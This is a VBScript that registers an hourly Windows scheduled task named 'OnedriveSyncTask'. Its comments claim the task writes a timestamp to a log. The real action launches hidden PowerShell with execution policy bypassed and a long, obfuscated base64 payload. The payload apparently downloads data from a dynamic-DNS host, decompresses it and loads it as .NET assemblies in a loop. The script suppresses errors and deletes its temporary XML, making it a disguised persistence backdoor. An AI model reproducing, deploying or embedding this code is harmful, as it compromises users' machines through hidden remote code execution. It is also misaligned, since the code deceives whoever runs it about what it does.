' VBScript to create an hourly scheduled task for the current user using an XML definition.
' This method avoids requiring administrative privileges for simple user-level tasks.

Option Explicit

' --- Configuration ---
Const TASK_NAME = "OnedriveSyncTask"
Const TASK_DESCRIPTION = "Runs a Onedrive sync task for current user."
Const TASK_ACTION_COMMAND = "conhost.exe"
' The task will append a timestamp to a log file in the user's temporary directory.
Const TASK_ACTION_ARGS = "--headless powershell -noni -sta -windowstyle hidden -ep bypass -ec JAA4ADYAZwBNAD0AIAAgACIAIAApACcAWAAnACsAXQAwADMAWwBFAE0ATwBoAHMAcAAkACsAXQA0AFsARQBtAG8AaABzAHAAJAAgACgAIAAuAHwAIAApACcAfAAnACwAKQA1ADYAXQByAGEASABjAFsAKwA2ADEAMQBdAHIAYQBIAGMAWwArADgAMQAxAF0AcgBhAEgAYwBbACgAKABFAEMAYQBMAFAARQBSAC4AKQA0ADMAXQByAGEASABjAFsAXQBHAG4AaQBSAFQAcwBbACwAJwBwAEcAdwAnACgARQBDAGEATABQAEUAUgAuACkAJwAkACcALAAnAEUAawBiACcAKABFAEMAYQBMAFAARQBSAC4AKQA5ADMAXQByAGEASABjAFsAXQBHAG4AaQBSAFQAcwBbACwAJwBZAGEAcQAnACgARQBDAGEATABQAEUAUgAuACkAJwApAFkAYQBxAHgAWQBhAHEAKwBdADMAMQBbAGQASQBsAEwARQBoACcAKwAnAHMARQBrAGIAKwBdADEAWwBEAGkAbABMAGUASABTACcAKwAnAEUAawBiACAAKAAmACAAQQB0AHYAKQA5ADMAXQByACcAKwAnAGEASABjAFsAXQBHAE4AaQByAHQAcwBbACwAKQAxADUAXQByAGEASABjAFsAKwAwADAAMQBdAHIAYQBIAGMAWwArADQAMAAxAF0AcgBhAEgAYwBbACgAKABlAGMAQQBMAHAARQBSAC4AKQA0ADIAMQBdAHIAYQBIAGMAWwBdAEcATgBpAHIAdABzAFsALABZAGEAcQAnACsAJwBSADcAcABZAGEAcQAoAGUAYwAnACsAJwBBAEwAcABFAFIALgApACkAWQBhAHEACgBZAGEAcQAsAFkAYQBxAHUATwBKAHQAIAB1AC0AIABrAGMAZQBoAEMAMwAnACsAJwBkAGgAKwAzAGQAaABTAFAAPQBvAE8ASgB0ACAAIAAgACcAKwAnACAACgANACcAKwAnADEAIABwAGUAZQBsAHMALQB0AHIAYQB0AHMAIAAgACAAIAAKAA0AUgAnACsAJwBrAEcAcABlAGYAZABqAGEALwAnACsAJwBSAGsARwA9AGoATwBKAHQAOwBSAGsARwA4ADkAZQBmAHYAcQAvAFIAawBHAD0AegBPAEoAdAA7AFIAawBHAGUAaABjAGEAYwAnACsAJwAuAHgAZQBkAG4AaQAvAFIAawBHAD0AZgBPAEoAdAA7AFIAawBHAG0AbwBjAC4AYwBuAHYAeQBtAC4AbgBvAGkAJwArACcAdABhAHIAbwBwAHIAbwBjAC0AdABlAG4AeQBrAHMALwAvADoAcAB0AHQAaABSAGsARwA9AHUATwBKAHQAIAAgACAAWQBhAHEALABZAGEAcQBoACsAMwBkAGgAbwBPAEoAdAAoAGQAYQBvAEwAOgA6AF0AeQBsAGIAbQBlAHMAcwBBAC4AbgBvAGkAdABZAGEAcQAsAFkAYQBxAC4AMwBkAFkAYQBxACwAWQAnACsAJwBhAHEAZQB0AHMAeQBTAFsAPQBiAE8ASgB0ACAAIAAgACAAIAAnACsAJwAgACAAIAAKAA0AKQApACkAZgBPAEoAdAArAHUATwBKAHQAKABhAHQAYQBEAGQAYQAzAGQAaAArADMAZABoAG8AbABuAHcAbwBEAC4AKQAoAHcAZQAzAGQAaAArADMAZABoAG4AOgAzAGQAaAArADMAJwArACcAZABoADoAMwBkAGgAKwAzAGQAaABdAHQAbgBlAGkAbABDAGIAZQBXAC4AdABZAGEAcQAsAFkAYQBxAEcAegBPAEoAdAB1AFkAYQBxACwAWQBhAHEAIAAKAA0AKQAoAHcAZQBuADoAOgBdAG0AYQBlAHIAdABTAHkAcgBvAG0AZQBNAC4ATwBJACcAKwAnAC4AbQAnACsAJwBlAHQAcwB5AFMAWwA9AG8ATwAnACsAJwBKAHQAIABZAGEAcQAsAFkAYQBxAE8ASgB0ACAAbgByAHUAdABlAHIAIAB7ACAAaABjAHQAYQBjACAAfQAgACAAIAAgADMAZABoACsAMwBkAFkAYQBxACwAWQBhAHEADQBsAGwAdQBOAC0AdAB1AE8AIABGAHoAcQAgACkAKQAoAHkAYQByAHIAQQBvAFQALgBvAE8ASgB0ACgAZABhAG8ATAA6ADoAXQB5AGwAYgBtAGUAJwArACcAcwBzAEEALgBuAG8AaQB0AGMAJwArACcAZQBsAGYAZQBSAC4AbQBlAHQAcwB5AFMAMwBkAGgAWQBhAHEALABZAGEAcQBoACAAIAAgACAAIAAgACAAIAAKAA0AKABtAGEAcgBhAHAAIAAgACAAIAAKAA0AewAgAGsAYwBlAGgAQwBTAFAAIABuACcAKwAnAG8AaQB0AGMAbgB1AGYACgANAFIAJwArACcAawBHAGUAdQAnACsAJwBuAFkAYQBxACwAWQBhAHEAaQB0AG4AbwBDAHkAbAB0AG4AZQBsAGkAUwBSAGsARwA9AGUAYwBuAGUAcgBlAGYAMwBkAGgAKwAzACcAKwAnAGQAaABlAHIAUABuAG8AaQB0AGMAQQByAG8AcgByAEUATwBKAHQAMwBkAGgAKAAoACAAWQAnACsAJwBhAHEALAAnACsAJwBZAGEAcQBlAE4ALgBZAGEAcQAsAFkAYQBxAC4AbQBlAHQAcwB5AFMAWwA9AHMATwBKAHQAWQBhAHEALABZAGEAcQBoAAoADQAzAGQAaAArADMAZABoAG8ATwBKAHQAJwArACcAIABuAHIAdQB0AGUAcgAgACAAIAAgACcAKwAnACAAIAAgACAACgANACkAKABlAHMAbwBsAEMALgBtADMAZABoACsAMwBkAGgAJwArACcATwBKAHQAOwApACgAZQBzAG8AbABDAC4AZABPAEoAdAAgACAAIAAgACAAIAAgACAACgANACkAbwBPAEoAdAAoAG8AVAB5AHAAbwBDACcAKwAnAC4AZABPAEoAJwArACcAWQBhAHEALABZAGEAcQB0ACAAIAAgACAAIAAgACAAWQBhAHEALABZAGEAcQBPAEoAdABSAGsARwAsACgAQAAoAHQAaQBuAEkAOgA6ACcAKwAnAF0AbQBhAHIAZwBvAHIAUAAuAGgAYwBhAGUAQgBbADMAZABoACsAMwBkAGgAIAAgACcAKwAnACAAIAAKAA0AKQAoAGUAcwBvAGwAQwAuAG8ATwBKAHQAIAAgADMAZABoACsAMwBkAGgAIAAgAFkAYQBxACwAWQBhAHEAMQAxACcAKwAnAF0AcgBhAEgAYwBbACgAIABFAGMAYQBsAFAARQByAGMALQAgACkAMwBkAGgAfQAgAHsAIABoAGMAdABhAGMAIAB9AAoADQApAFIAawBHAHAAZQBmAGQAagBhAFIAawBHACgAbgBpAGcAdQBsAFAAYwBlAHgARQA6ADoAXQBtAGEAcgBnAG8AcgBQAC4AaABjAGEAZQBCAFsAIAAgACAAIAAKAA0AMQAgAHAAZQBlAGwAcwAtACcAKwAnAHQAcgBhAHQAcwAgACAAIAAgAAoADQApACkAUgAnACsAJwBrAFkAYQBxACwAWQBhAHEATwBKAHQAIABmAC0AIAB1AE8ASgB0ACAAdQAtACAAawBjAGUAaABDAFMAUAA9AG8AMwBkAGgAKwBZAGEAcQAsAFkAYQBxAE8ASQAuAG0AZQB0AHMAeQBTAFsAPQBkAE8ASgB0ACAAIAAgACAAIAAgACAAIAAKAA0AKQBiAE8ASgB0ACcAKwAnACgAJwArACcAdwBlAG4AOgA6AF0AbQBhAGUAcgB0ADMAZABoACsAMwBkAGgAUwB5AHIAbwBtAGUATQAuAE8ASQAnACsAJwAuAG0AZQB0AHMAeQBTAFsAPQBtAE8ASgB0ACAAIAAgACAAJwArACcAIAAgACAAIAAKADMAJwArACcAZABoACsAMwBkAGgADQApAHMATwBKAHQAKABZAGEAcQAsAFkAYQBxACAAIAAgACAACgANACkAKQBSAGsARwBSAGsARwAsACgAQAAoAHQAaQAnACsAJwBuAEkAJwArACcAOgA6AF0AaAAzAGQAaAArADMAZABoAHQAQQBbACAAIAAgACAACgANACkAKABlAHMAbwBsAEMALgBvAE8ASgB0ACAAIAAgACAACgANAGwAbAB1AE4ALQB0AHUATwAgAEYAegBxACAAKQApACgAeQBhAHIAcgBBAG8AVABZAGEAcQAnACsAJwAsAFkAYQBxACsAMwBkAGgAWwAgACcAKwAnACAAIAAgAAoAJwArACcADQBmAFkAYQBxACwAWQBhAHEAIAAgACAAIAAgACAAIAAKAA0AKQBzAHMAZQByAHAAbQBvAGMAZQBEADoAOgBdAGUAZABvAE0AbgBvAGkAcwBzAGUAcgBwAG0AbwBDAC4AbgAnACsAJwBvAGkAcwBzAGUAcgBwAG0AbwBDAC4ATwBJACcAKwAnAC4AbQBlAHQAcwB5AFMAJwArACcAWwAsAG0ATwBKAHQAKAB3AGUAbgA6ADoAXQBtAGEAZQByAHQAUwBlAHQAYQBsAGYAZQBEAC4AbgBvAGkAcwBzAGUAcgBwADMAZABoACsAMwBkAGgAbQBvAEMALgBZAGEAcQAsAFkAYQBxADMAZABoACsAMwBkAGgAbABmAGUAUgAnACsAJwAuAG0AZQB0AHMAeQBTAFsAIAAgACAAIAAKAA0AZABhAG8ATAAgAHkAdABpAGwAaQB0AFUAIABJAFMATQBBACAAIwAgACAAIAAgAAoADQBqAE8ASgB0ACAAZgAtACAAMwBkAGgAWQBhAHEALABZAGEAcQAnACsAJwAgACAAIAAgACAAIAAgACAACgANAHsAeQByAHQAIAAgACAAIAAKAA0ACgANACkAIAAgACAAIAAKAA0AZgBPAEoAdABdAGcAbgBpAHIAdABzAFsAIAAgACAAIAAgACAAIAAgAAoADQBdACkAZQB1AHIAdABPAEoAdAAgAD0AIAB5AHIAbwB0AGEAZABuAGEATQAoAHIAZQAnACsAJwB0AGUAbQBhAHIAYQBQAFsAIAAgADMAZABoACsAMwBkAGgAIAAgACAAIAAgACAACgANACwAdQBPACcAKwAnAEoAdABdAGcAbgBpAHIAdABzAFsAIAAgACAAIAAgACAAIAAgAAoADQBdACkAZQB1AHIAdABPADMAZABoACsAMwBkAGgASgB0ACAAPQAgAHkAcgBvAHQAYQBkAG4AYQBNACgAcgBlAHQAZQBtAGEAJwArACcAcgBhAFAAWwAzAGQAaAArADMAZABZAGEAcQAsAFkAYQBxACkAMwBkAGgAMwBkACcAKwAnAGgAbgBJAE8AagAtAF0AMgAsADEAMQAsADMAWwBFAG0AYQBuACcAKwAnAC4AKQAzAGQAaAAqAFkAYQBxACwAWQBhAHEAZwBuAGkAJwArACcAcgB0AFMAJwArACcANAA2AGUAcwBhAEIAbQBvAHIARgA6ADoAXQB0AHIAZQB2AG4AbwBDAC4AbQBZAGEAcQAsAFkAYQBxACgAKAAgACYAIABSADcAcAAgACkANAAyADEAXQByAGEASABjAFsALAApADAANwBdAHIAYQBIAGMAWwArADIAMgAxAF0AcgBhAEgAYwBbACsAMwAxADEAXQByAGEAJwArACcASABjAFsAKAAgAEUAYwBhAGwAUABFAHIAYwAtACAAIAA0ADMAXQByAGEASABjAFsALAApADIAOABdAHIAYQBIAGMAWwArADcAMAAxAF0AcgBhAEgAYwBbACcAKwAnACsAMQA3AF0AcgBZAGEAcQAsAFkAYQBxACAACgAzAGQAaAArAFkAYQBxACwAWQBhAHEAbQBlAHQAcwAzAGQAaAArADMAZABoAHkAUwBbACgAKABnAG4AaQByAHQAUwB0AGUARwAuAEkASQBDAFMAQQA6ADoAXQBnADMAZABoACsAMwBkAGgAbgBpAGQAbwBjAG4ARQAuAHQAeABlAFQAWQBhAHEALABZAGEAcQBhAEgAYwBbACgAIAAgAEUAQwBhAEwAUABFAHIALQAgADYAMwBdAHIAYQBIAGMAWwAsACkAOQA3AF0AcgBhAEgAJwArACcAYwBbACsANAA3AF0AcgBhAEgAYwBbACsANgAnACsAJwBZAGEAcQAsAFkAYQBxAGMAZQBZAGEAcQAsAFkAYQBxADMAZABoAA0AewAgAHkAcgB0AAoADQAKAA0AfQAKAA0AfQAgAGwAbAB1AG4AWQBhAHEALABZAGEAcQAzAGQAaABPAEoAdAAgACAAIAAgAAoADQBkAGEAbwBMACAAawBvAFQAawBpAFQAIAAjACAAMwAnACsAJwBkAGgAJwArACcAKwAzAGQAaAAgACAAIAAKAA0ACgANACkAUgBrAEcAUgBrAEcAKABZAGEAcQAsAFkAYQBxACsAMwBkAGgAWQBhAHEALABZAGEAcQByAEQATQAqADMAZABoACAAZQBsAGIAQQBpAFIAQQB2AFkAYQBxACwAWQBhAHEAbgBpAGcAdQBsAFAAYwBlAHgARQA6ADoAXQBoAHQAQQBbACAAIAAgACAACgAnACsAJwANADEAIABwAGUAZQBsAHMALQB0AHIAYQB0AHMAWQBhAHEAIABmAC0AIABwAEcAdwB9ADEAJwArACcAMQB7AH0AMQB7ACcAKwAnAH0AOQB7AH0ANgB7AH0AOQAxAHsAfQAwADMAewB9ADAAMgB7AH0ANQAzAHsAfQA3ADIAewB9ADUAMQB7AH0AOAAxAHsAfQAzAHsAfQAwAHsAfQA2ADEAewB9ADIAMwB7AH0AMwAzAHsAfQA1AHsAfQAzADEAewB9ADIAewB9ADQAMwB7AH0AJwArACcAOAB7AH0ANAB7AH0AOAAyAHsAfQAyADIAewB9ADEAMgB7AH0AOQAyAHsAfQA0ADEAewB9ADcAMQB7AH0AMAAxAHsAfQAxADMAewB9ADQAMgB7AH0ANwB7AH0AMwAyAHsAfQAyADEAewB9ADYAMgB7AH0ANQAyAHsAcABHAHcAKAAnACsAJwAoACAAJwAoACAAIgA7ACAAIgAkACgAIAAkAG8ARgBzACAAPQAnACcAKQAiACAAKwAgAFsAcwBUAHIAaQBOAGcAXQAoACgAIAB2AEEAUgBJAGEAYgBsAEUAIAAgACgAIgA4ADYARwAiACsAIgBNACIAKQAgAC0AdgBhAGwAVQBFAG8AbgBMACAAKQBbAC0AIAAxACAALgAuACAALQAoACgAIAB2AEEAUgBJAGEAYgBsAEUAIAAgACgAIgA4ADYARwAiACsAIgBNACIAKQAgAC0AdgBhAGwAVQBFAG8AbgBMACAAKQAuAEwAZQBOAGcAVABIACAAKQAgAF0AKQArACIAIAAkACgAIABTAGUAdAAtAEkAdABlAG0AIAAnAHYAQQByAGkAQQBCAGwAZQA6AG8AZgBTACcAIAAnACAAJwAgACkAIgB8ACYAKAAoAEcAZQBUAC0AdgBBAHIASQBBAEIATABlACAAJwAqAE0ARABSACoAJwApAC4AbgBhAE0ARQBbADMALAAxADEALAAyAF0ALQBKAE8ASQBOACcAJwApAA=="
' ---------------------

Dim WshShell, FSO, objNet
Dim tempFolder, xmlFilePath, xmlContent
Dim strUser, strDomain, strPrincipal, strCurrentDate, strCurrentTime
Dim RetVal

Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")
Set objNet = CreateObject("WScript.Network")

On Error Resume Next

' 1. Get required paths and user information
tempFolder = WshShell.ExpandEnvironmentStrings("%TEMP%")
xmlFilePath = FSO.BuildPath(tempFolder, "be42ecd2-cd10-11f0-a133-a80b041abf4d")

' Get current user/domain for the task principal
strUser = objNet.UserName
strDomain = objNet.UserDomain
strPrincipal = strDomain & "\" & strUser

' Get current date/time in ISO 8601 format for StartBoundary (YYYY-MM-DDTHH:MM:SS)
strCurrentDate = DatePart("yyyy", Now) & "-" & Pad(DatePart("m", Now)) & "-" & Pad(DatePart("d", Now))
strCurrentTime = Pad(DatePart("h", Now)) & ":" & Pad(DatePart("n", Now)) & ":" & Pad(DatePart("s", Now))

' 2. Construct the Task XML Content
' The LogonType "InteractiveToken" ensures the task runs only when the user is logged in
' and avoids requiring a password to be stored, relying on the user's session token.
xmlContent = "<?xml version=""1.0"" encoding=""UTF-16""?>" & vbCrLf & _
             "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">" & vbCrLf & _
             "  <RegistrationInfo>" & vbCrLf & _
             "    <Author>" & strPrincipal & "</Author>" & vbCrLf & _
             "    <Description>" & TASK_DESCRIPTION & "</Description>" & vbCrLf & _
             "  </RegistrationInfo>" & vbCrLf & _
             "  <Settings>" & vbCrLf & _
             "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" & vbCrLf & _
             "    <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>" & vbCrLf & _
             "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" & vbCrLf & _
             "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>" & vbCrLf & _
             "    <RunOnlyIfIdle>false</RunOnlyIfIdle>" & vbCrLf & _
             "  </Settings>" & vbCrLf & _
             "  <Triggers>" & vbCrLf & _
             "    <TimeTrigger>" & vbCrLf & _
             "      <StartBoundary>" & strCurrentDate & "T" & strCurrentTime & "</StartBoundary>" & vbCrLf & _
             "      <Enabled>true</Enabled>" & vbCrLf & _
             "      <Repetition>" & vbCrLf & _
             "        <Interval>PT1H</Interval>" & vbCrLf & _
             "        <StopAtDurationEnd>false</StopAtDurationEnd>" & vbCrLf & _
             "      </Repetition>" & vbCrLf & _
             "    </TimeTrigger>" & vbCrLf & _
             "  </Triggers>" & vbCrLf & _
             "  <Principals>" & vbCrLf & _
             "    <Principal id=""Author"">" & vbCrLf & _
             "      <LogonType>InteractiveToken</LogonType>" & vbCrLf & _
             "      <UserId>" & strPrincipal & "</UserId>" & vbCrLf & _
             "    </Principal>" & vbCrLf & _
             "  </Principals>" & vbCrLf & _
             "  <Actions Context=""Author"">" & vbCrLf & _
             "    <Exec>" & vbCrLf & _
             "      <Command>" & TASK_ACTION_COMMAND & "</Command>" & vbCrLf & _
             "      <Arguments>" & TASK_ACTION_ARGS & "</Arguments>" & vbCrLf & _
             "    </Exec>" & vbCrLf & _
             "  </Actions>" & vbCrLf & _
             "</Task>"

' 3. Write the XML to the temporary file
Dim xmlFile
Set xmlFile = FSO.CreateTextFile(xmlFilePath, True, True) ' True for overwrite, True for Unicode (UTF-16)
xmlFile.Write xmlContent
xmlFile.Close

' 4. Create the scheduled task using schtasks /create /xml
Dim schtasksCmd
schtasksCmd = "schtasks /create /tn """ & TASK_NAME & """ /xml """ & xmlFilePath & """ /F"
'Wscript.Echo "Creating scheduled task with command: " & schtasksCmd

WshShell.Run schtasksCmd, 0, True ' 0 = hidden, True = wait for completion

RetVal = Err.Number
' If RetVal = 0 Then
'     WScript.Echo "SUCCESS: Scheduled task '" & TASK_NAME & "' created successfully for user: " & strPrincipal
' Else
'     WScript.Echo "ERROR: Failed to create scheduled task. Error code: " & RetVal
'     WScript.Echo "Command attempted: " & schtasksCmd
' End If

' 5. Delete the temporary XML file
If FSO.FileExists(xmlFilePath) Then
    FSO.DeleteFile xmlFilePath, True
    'WScript.Echo "Cleanup: Temporary XML file deleted."
    ' Wscript.Echo "Cleanup: Temporary XML file located at " & xmlFilePath & " (not deleted for review)."
End If

' Helper function to zero-pad single digits (e.g., 5 -> 05)
Function Pad(num)
    If num < 10 Then
        Pad = "0" & num
    Else
        Pad = CStr(num)
    End If
End Function